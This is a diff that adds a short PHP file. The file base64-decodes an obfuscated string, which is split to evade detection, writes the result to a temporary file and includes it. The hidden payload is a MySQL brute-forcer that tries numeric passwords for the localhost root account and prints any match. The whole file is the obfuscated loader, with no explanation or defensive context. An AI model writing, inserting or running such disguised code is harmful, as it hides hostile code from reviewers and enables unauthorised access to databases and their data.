@@ -1,0 +1,5 @@
+<?php
+$tmp=tempnam('/tmp','FOO');
+$c=base64_decode('P'.'z48P3BocAovL215c3FsIGJydXRlZm9yY2VyCi8vIG9iX3N0YXJ0KCk7CiRsaW1pdD1yYW5nZSgwLDEwMDAwKTsKZm9yZWFjaCAoJGxpbWl0IGFzICRpKQoJaWYgKEBteXNxbGlfY29ubmVjdCgibG9jYWxob3N0Iiwicm9vdCIsJGkuIiIpKSBicmVhazsKLy8gb2JfZW5kX2NsZWFuKCk7CmlmIChpbl9hcnJheSgkaSwgJGxpbWl0KSBhbmQgJGkhPWVuZCgkbGltaXQpKQoJZWNobyAicGFzc3dvcmQgaXMgeyRpfSI7CmVsc2UKCWVjaG8gIk5vdCBmb3VuZCI7');
+file_put_contents($tmp, $c);
+include $tmp;
